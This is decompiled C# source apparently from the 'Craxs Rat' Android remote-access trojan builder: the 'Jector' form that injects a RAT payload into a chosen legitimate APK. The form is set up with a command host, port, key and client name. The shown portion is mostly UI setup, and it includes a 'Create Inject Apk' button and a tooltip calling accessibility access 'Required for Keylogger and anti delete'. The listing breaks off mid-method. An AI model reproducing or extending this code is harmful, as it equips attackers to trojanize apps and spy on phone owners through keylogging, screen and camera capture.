using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Craxs_Rat.My;
using Craxs_Rat.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class Jector : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__287_002D0
	{
		public string _0024VB_0024Local_msg;

		public Jector _0024VB_0024Me;

		public _Closure_0024__287_002D0(_Closure_0024__287_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_msg = arg0._0024VB_0024Local_msg;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__1()
		{
			_0024VB_0024Me.log.AppendText(Environment.NewLine + _0024VB_0024Local_msg.Replace("I:", "> "));
		}

		[SpecialName]
		internal void _Lambda_0024__2()
		{
			_0024VB_0024Me.log.AppendText(Environment.NewLine + _0024VB_0024Local_msg);
		}

		[SpecialName]
		internal void _Lambda_0024__3()
		{
			_0024VB_0024Me.log.AppendText(Environment.NewLine + _0024VB_0024Local_msg.Replace("E:", "ERROR :"));
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__287_002D1
	{
		public Exception _0024VB_0024Local_ex;

		public Jector _0024VB_0024Me;

		public _Closure_0024__287_002D1(_Closure_0024__287_002D1 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_ex = arg0._0024VB_0024Local_ex;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__10()
		{
			_0024VB_0024Me.log.AppendText(Environment.NewLine + "Global Error: " + _0024VB_0024Local_ex.Message);
		}
	}

	private IContainer components;

	[AccessedThroughProperty("Button1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _Button1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addactiv")]
	[CompilerGenerated]
	private Button _addactiv;

	[AccessedThroughProperty("Button3")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Button _Button3;

	[AccessedThroughProperty("DrakeUITitlePanel2")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUITitlePanel _DrakeUITitlePanel2;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("removeactiv")]
	private Button _removeactiv;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("CheckAutomatic")]
	private DrakeUICheckBox _CheckAutomatic;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("selectapkbtn")]
	private Button _selectapkbtn;

	private string TheApkPath;

	private string N__ask_prim_;

	private const string _ask_prim_ = "_ask_prim_";

	private string N__access_ask_;

	private const string _access_ask_ = "_access_ask_";

	private string N_newEngineWorkerins;

	private const string EngineWorkerins = "EngineWorkerins";

	private string N__srv_worker_;

	private const string _srv_worker_ = "_srv_worker_";

	private string N_cap_sc_;

	private const string _cap_sc_ = "_cap_sc_";

	private string N_update_app_;

	private const string _update_app_ = "_update_app_";

	private string N_WackMeUpJob;

	private const string WackMeUpJob = "WackMeUpJob";

	private string N_ClassGen;

	private const string ClassGen = "ClassGen";

	private string N__ask_draw_;

	private const string _ask_draw_ = "_ask_draw_";

	private string N__ask_battary_;

	private const string _ask_battary_ = "_ask_battary_";

	private string N__CamActivity_;

	private const string CamActivity = "CamActivity";

	private string N__SCRActivity_;

	private const string SCRActivity = "SCRActivity";

	private string N__webviewer_;

	private const string webviewer = "webviewer";

	private string N__scctrl_;

	private const string _scctrl_ = "_scctrl_";

	private string newgetbyts;

	private string newsrvrun;

	private string split1;

	private string split2;

	private string split3;

	private string split4;

	private string newhost;

	private string newport;

	private string newkey;

	private string newalive;

	private string newname;

	private string neweco;

	private string newconect;

	private string newsokt;

	private string newstrtconct;

	private string newcnl;

	private string newcnm;

	private string newsndmthd;

	private string newforuce;

	private string newplgs;

	private string NEWRANDOM;

	private string KeepScreen;

	private List<string> ALLPRIMSLIST;

	private int cou;

	public string TK;

	public bool need_write;

	public bool need_battery;

	public bool need_read;

	public bool need_forground;

	public bool need_syswinow;

	public bool need_boot;

	public bool need_all;

	public bool ASKPRIM_all;

	public bool Once;

	public bool HoldMainThread;

	private Process cmdProcess;

	public string WorkingDir;

	private bool FoundJava;

	private string apktemp;

	private string apktoolpath;

	private string Apksignerpath;

	private string ApkZIPpath;

	private string outputapk;

	private string originalapkname;

	private string Apkeditorpath;

	private bool protectfinished;

	public Random rshit;

	public int cou3;

	public static int WM_NCLBUTTONDOWN;

	public static int HT_CAPTION;

	[SpecialName]
	private Random _0024STATIC_0024RandomShit_00242021C88_0024r;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024RandomShit_00242021C88_0024r_0024Init;

	[SpecialName]
	private Random _0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init;

	[SpecialName]
	private Random _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init;

	private Random STATICRandomShit2021C88r;

	private StaticLocalInitFlag STATICRandomShit2021C88rInit;

	private Random STATICGenerateRandomNumber202888Random_Number;

	private StaticLocalInitFlag STATICGenerateRandomNumber202888Random_NumberInit;

	private Random STATICCraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq2021C88r;

	private StaticLocalInitFlag STATICCraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq2021C88rinit;

	private StaticLocalInitFlag STATIRandomShit2021C88rInit;

	private Random GenerateRandomNumber202888Random_Number;

	private StaticLocalInitFlag STATICraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq2021C88rInit;

	private Random STATICraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq2021C88r;

	private StaticLocalInitFlag STATICCraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq2021C88rInit;

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("FolderPath")]
	internal virtual TextBox FolderPath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				button.Click -= value2;
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	internal virtual Button addactiv
	{
		[CompilerGenerated]
		get
		{
			return _addactiv;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = addactiv_click;
			Button button = _addactiv;
			if (button != null)
			{
				button.Click -= value2;
			}
			_addactiv = value;
			button = _addactiv;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("log")]
	internal virtual TextBox log
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button3_Click;
			Button button = _Button3;
			if (button != null)
			{
				button.Click -= value2;
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checksuper")]
	internal virtual CheckBox checksuper
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("paneltargetfolder")]
	internal virtual Panel paneltargetfolder
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolTip1")]
	internal virtual ToolTip ToolTip1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkkill")]
	internal virtual CheckBox checkkill
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Host")]
	internal virtual DrakeUITextBox Host
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TheKey")]
	internal virtual DrakeUITextBox TheKey
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Port")]
	internal virtual DrakeUITextBox Port
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CLiname")]
	internal virtual DrakeUITextBox CLiname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("maintapcontrols")]
	internal virtual DrakeUITabControlMenu maintapcontrols
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage1")]
	internal virtual TabPage TabPage1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("list_activ")]
	internal virtual TabPage list_activ
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage3")]
	internal virtual TabPage TabPage3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage4")]
	internal virtual TabPage TabPage4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Activlist")]
	internal virtual DrakeUIListBox Activlist
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIAvatar4")]
	internal virtual DrakeUIAvatar DrakeUIAvatar4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITitlePanel DrakeUITitlePanel2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUITitlePanel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUITitlePanel2_Click;
			DrakeUITitlePanel drakeUITitlePanel = _DrakeUITitlePanel2;
			if (drakeUITitlePanel != null)
			{
				drakeUITitlePanel.Click -= value2;
			}
			_DrakeUITitlePanel2 = value;
			drakeUITitlePanel = _DrakeUITitlePanel2;
			if (drakeUITitlePanel != null)
			{
				drakeUITitlePanel.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label12")]
	internal virtual Label Label12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIAvatar5")]
	internal virtual DrakeUIAvatar DrakeUIAvatar5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label14")]
	internal virtual Label Label14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ComboPrims")]
	internal virtual ComboBox ComboPrims
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button removeactiv
	{
		[CompilerGenerated]
		get
		{
			return _removeactiv;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Removeactiv_Click;
			Button button = _removeactiv;
			if (button != null)
			{
				button.Click -= value2;
			}
			_removeactiv = value;
			button = _removeactiv;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("checkDraw")]
	internal virtual CheckBox checkDraw
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIAvatar6")]
	internal virtual DrakeUIAvatar DrakeUIAvatar6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkautoclick")]
	internal virtual CheckBox checkautoclick
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnulpanel")]
	internal virtual Panel mnulpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("autopanel")]
	internal virtual Panel autopanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox CheckAutomatic
	{
		[CompilerGenerated]
		get
		{
			return _CheckAutomatic;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = CheckAutomatic_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _CheckAutomatic;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_CheckAutomatic = value;
			drakeUICheckBox = _CheckAutomatic;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("labeltargetapp")]
	internal virtual Label labeltargetapp
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TargetApktext")]
	internal virtual TextBox TargetApktext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button selectapkbtn
	{
		[CompilerGenerated]
		get
		{
			return _selectapkbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Selectapkbtn_Click;
			Button button = _selectapkbtn;
			if (button != null)
			{
				button.Click -= value2;
			}
			_selectapkbtn = value;
			button = _selectapkbtn;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("panelactivitys")]
	internal virtual Panel panelactivitys
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkonlymain")]
	internal virtual DrakeUICheckBox checkonlymain
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("msgtext")]
	internal virtual DrakeUITextBox msgtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("titletext")]
	internal virtual DrakeUITextBox titletext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W1")]
	internal virtual DrakeWidth_W DrakeWidth_W1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkprotector")]
	internal virtual DrakeUICheckBox checkprotector
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkkeepscreen")]
	internal virtual CheckBox checkkeepscreen
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = base.CreateParams;
			createParams.ExStyle |= 128;
			return createParams;
		}
	}

	static Jector()
	{
		WM_NCLBUTTONDOWN = 161;
		HT_CAPTION = 2;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.Label1 = new System.Windows.Forms.Label();
		this.Label2 = new System.Windows.Forms.Label();
		this.Label3 = new System.Windows.Forms.Label();
		this.FolderPath = new System.Windows.Forms.TextBox();
		this.Button1 = new System.Windows.Forms.Button();
		this.addactiv = new System.Windows.Forms.Button();
		this.Label5 = new System.Windows.Forms.Label();
		this.log = new System.Windows.Forms.TextBox();
		this.Button3 = new System.Windows.Forms.Button();
		this.Label4 = new System.Windows.Forms.Label();
		this.checksuper = new System.Windows.Forms.CheckBox();
		this.Label7 = new System.Windows.Forms.Label();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.Host = new DrakeUI.Framework.DrakeUITextBox();
		this.TheKey = new DrakeUI.Framework.DrakeUITextBox();
		this.Port = new DrakeUI.Framework.DrakeUITextBox();
		this.CLiname = new DrakeUI.Framework.DrakeUITextBox();
		this.paneltargetfolder = new System.Windows.Forms.Panel();
		this.ToolTip1 = new System.Windows.Forms.ToolTip(this.components);
		this.checkkill = new System.Windows.Forms.CheckBox();
		this.DrakeUIAvatar5 = new DrakeUI.Framework.DrakeUIAvatar();
		this.checkDraw = new System.Windows.Forms.CheckBox();
		this.checkautoclick = new System.Windows.Forms.CheckBox();
		this.DrakeUIAvatar6 = new DrakeUI.Framework.DrakeUIAvatar();
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.maintapcontrols = new DrakeUI.Framework.DrakeUITabControlMenu();
		this.TabPage1 = new System.Windows.Forms.TabPage();
		this.list_activ = new System.Windows.Forms.TabPage();
		this.Label6 = new System.Windows.Forms.Label();
		this.DrakeWidth_W1 = new DrakeUI.Framework.DrakeWidth_W();
		this.checkprotector = new DrakeUI.Framework.DrakeUICheckBox();
		this.panelactivitys = new System.Windows.Forms.Panel();
		this.Activlist = new DrakeUI.Framework.DrakeUIListBox();
		this.removeactiv = new System.Windows.Forms.Button();
		this.checkonlymain = new DrakeUI.Framework.DrakeUICheckBox();
		this.CheckAutomatic = new DrakeUI.Framework.DrakeUICheckBox();
		this.labeltargetapp = new System.Windows.Forms.Label();
		this.TargetApktext = new System.Windows.Forms.TextBox();
		this.selectapkbtn = new System.Windows.Forms.Button();
		this.TabPage3 = new System.Windows.Forms.TabPage();
		this.msgtext = new DrakeUI.Framework.DrakeUITextBox();
		this.titletext = new DrakeUI.Framework.DrakeUITextBox();
		this.Label14 = new System.Windows.Forms.Label();
		this.ComboPrims = new System.Windows.Forms.ComboBox();
		this.Label12 = new System.Windows.Forms.Label();
		this.TabPage4 = new System.Windows.Forms.TabPage();
		this.DrakeUIAvatar4 = new DrakeUI.Framework.DrakeUIAvatar();
		this.DrakeUITitlePanel2 = new DrakeUI.Framework.DrakeUITitlePanel();
		this.mnulpanel = new System.Windows.Forms.Panel();
		this.autopanel = new System.Windows.Forms.Panel();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.checkkeepscreen = new System.Windows.Forms.CheckBox();
		this.Panel1.SuspendLayout();
		this.paneltargetfolder.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		this.maintapcontrols.SuspendLayout();
		this.TabPage1.SuspendLayout();
		this.list_activ.SuspendLayout();
		this.panelactivitys.SuspendLayout();
		this.TabPage3.SuspendLayout();
		this.TabPage4.SuspendLayout();
		this.DrakeUITitlePanel2.SuspendLayout();
		this.mnulpanel.SuspendLayout();
		this.Panel5.SuspendLayout();
		base.SuspendLayout();
		this.Label1.AutoSize = true;
		this.Label1.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label1.Location = new System.Drawing.Point(82, 215);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(108, 29);
		this.Label1.TabIndex = 1;
		this.Label1.Text = "Host or IP";
		this.Label2.AutoSize = true;
		this.Label2.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label2.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label2.Location = new System.Drawing.Point(405, 215);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(53, 29);
		this.Label2.TabIndex = 2;
		this.Label2.Text = "Port";
		this.Label3.AutoSize = true;
		this.Label3.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label3.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label3.Location = new System.Drawing.Point(411, 107);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(47, 29);
		this.Label3.TabIndex = 4;
		this.Label3.Text = "Key";
		this.FolderPath.BackColor = System.Drawing.Color.FromArgb(23, 23, 23);
		this.FolderPath.ForeColor = System.Drawing.Color.SkyBlue;
		this.FolderPath.Location = new System.Drawing.Point(8, 50);
		this.FolderPath.Name = "FolderPath";
		this.FolderPath.ReadOnly = true;
		this.FolderPath.Size = new System.Drawing.Size(536, 32);
		this.FolderPath.TabIndex = 7;
		this.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Button1.Font = new System.Drawing.Font("Calibri", 9f);
		this.Button1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Button1.Location = new System.Drawing.Point(429, 20);
		this.Button1.Name = "Button1";
		this.Button1.Size = new System.Drawing.Size(115, 27);
		this.Button1.TabIndex = 8;
		this.Button1.Text = "Select";
		this.Button1.UseVisualStyleBackColor = true;
		this.addactiv.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.addactiv.Font = new System.Drawing.Font("Calibri", 9f);
		this.addactiv.ForeColor = System.Drawing.Color.SkyBlue;
		this.addactiv.Location = new System.Drawing.Point(452, 19);
		this.addactiv.Name = "addactiv";
		this.addactiv.Size = new System.Drawing.Size(93, 34);
		this.addactiv.TabIndex = 11;
		this.addactiv.Text = "Add +";
		this.addactiv.UseVisualStyleBackColor = true;
		this.Label5.AutoSize = true;
		this.Label5.Font = new System.Drawing.Font("Calibri", 13f);
		this.Label5.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label5.Location = new System.Drawing.Point(20, 26);
		this.Label5.Name = "Label5";
		this.Label5.Size = new System.Drawing.Size(170, 27);
		this.Label5.TabIndex = 9;
		this.Label5.Text = "2: Target Activitys";
		this.log.BackColor = System.Drawing.Color.Black;
		this.log.Dock = System.Windows.Forms.DockStyle.Fill;
		this.log.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.log.ForeColor = System.Drawing.Color.Lime;
		this.log.Location = new System.Drawing.Point(0, 61);
		this.log.Multiline = true;
		this.log.Name = "log";
		this.log.ReadOnly = true;
		this.log.Size = new System.Drawing.Size(691, 568);
		this.log.TabIndex = 12;
		this.Button3.BackColor = System.Drawing.Color.Black;
		this.Button3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Button3.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Button3.ForeColor = System.Drawing.Color.SkyBlue;
		this.Button3.Location = new System.Drawing.Point(0, 0);
		this.Button3.Name = "Button3";
		this.Button3.Size = new System.Drawing.Size(691, 61);
		this.Button3.TabIndex = 13;
		this.Button3.Text = "Create Inject Apk ";
		this.Button3.UseVisualStyleBackColor = false;
		this.Label4.AutoSize = true;
		this.Label4.Font = new System.Drawing.Font("Calibri", 13f);
		this.Label4.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label4.Location = new System.Drawing.Point(3, 20);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(193, 27);
		this.Label4.TabIndex = 6;
		this.Label4.Text = "1: Target Apk Foder ";
		this.checksuper.AutoSize = true;
		this.checksuper.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold);
		this.checksuper.ForeColor = System.Drawing.Color.SkyBlue;
		this.checksuper.Location = new System.Drawing.Point(403, 165);
		this.checksuper.Name = "checksuper";
		this.checksuper.Size = new System.Drawing.Size(206, 28);
		this.checksuper.TabIndex = 16;
		this.checksuper.Text = "Request Accessibility";
		this.ToolTip1.SetToolTip(this.checksuper, "1: Required for Keylogger and anti delete\r\n\r\n2: Don't Enable if injected app Already Request it");
		this.checksuper.UseVisualStyleBackColor = true;
		this.Label7.AutoSize = true;
		this.Label7.Font = new System.Drawing.Font("Roboto Condensed", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label7.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label7.Location = new System.Drawing.Point(82, 107);
		this.Label7.Name = "Label7";
		this.Label7.Size = new System.Drawing.Size(131, 29);
		this.Label7.TabIndex = 18;
		this.Label7.Text = "Client Name";
		this.Panel1.Controls.Add(this.Label2);
		this.Panel1.Controls.Add(this.Label3);
		this.Panel1.Controls.Add(this.Label7);
		this.Panel1.Controls.Add(this.Label1);
		this.Panel1.Controls.Add(this.Host);
		this.Panel1.Controls.Add(this.TheKey);
		this.Panel1.Controls.Add(this.Port);
		this.Panel1.Controls.Add(this.CLiname);
		this.Panel1.Location = new System.Drawing.Point(30, 199);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(574, 334);
		this.Panel1.TabIndex = 19;
		this.Host.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Host.FillColor = System.Drawing.Color.Black;
		this.Host.Font = new System.Drawing.Font("Calibri", 12f);
		this.Host.ForeColor = System.Drawing.Color.White;
		this.Host.Location = new System.Drawing.Point(22, 249);
		this.Host.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.Host.Maximum = 2147483647.0;
		this.Host.Minimum = -2147483648.0;
		this.Host.Name = "Host";
		this.Host.Padding = new System.Windows.Forms.Padding(5);
		this.Host.Radius = 15;
		this.Host.RectColor = System.Drawing.Color.SkyBlue;
		this.Host.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Host.Size = new System.Drawing.Size(228, 32);
		this.Host.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Host.StyleCustomMode = true;
		this.Host.TabIndex = 22;
		this.Host.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.TheKey.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.TheKey.FillColor = System.Drawing.Color.Black;
		this.TheKey.Font = new System.Drawing.Font("Calibri", 12f);
		this.TheKey.ForeColor = System.Drawing.Color.SkyBlue;
		this.TheKey.Location = new System.Drawing.Point(314, 141);
		this.TheKey.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.TheKey.Maximum = 2147483647.0;
		this.TheKey.Minimum = -2147483648.0;
		this.TheKey.Name = "TheKey";
		this.TheKey.Padding = new System.Windows.Forms.Padding(5);
		this.TheKey.Radius = 15;
		this.TheKey.RectColor = System.Drawing.Color.SkyBlue;
		this.TheKey.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.TheKey.Size = new System.Drawing.Size(228, 32);
		this.TheKey.Style = DrakeUI.Framework.UIStyle.Custom;
		this.TheKey.StyleCustomMode = true;
		this.TheKey.TabIndex = 21;
		this.TheKey.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.Port.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Port.FillColor = System.Drawing.Color.Black;
		this.Port.Font = new System.Drawing.Font("Calibri", 12f);
		this.Port.ForeColor = System.Drawing.Color.SkyBlue;
		this.Port.Location = new System.Drawing.Point(314, 249);
		this.Port.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.Port.Maximum = 2147483647.0;
		this.Port.Minimum = -2147483648.0;
		this.Port.Name = "Port";
		this.Port.Padding = new System.Windows.Forms.Padding(5);
		this.Port.Radius = 15;
		this.Port.RectColor = System.Drawing.Color.SkyBlue;
		this.Port.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Port.Size = new System.Drawing.Size(228, 32);
		this.Port.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Port.StyleCustomMode = true;
		this.Port.TabIndex = 20;
		this.Port.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.CLiname.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.CLiname.FillColor = System.Drawing.Color.Black;
		this.CLiname.Font = new System.Drawing.Font("Calibri", 12f);
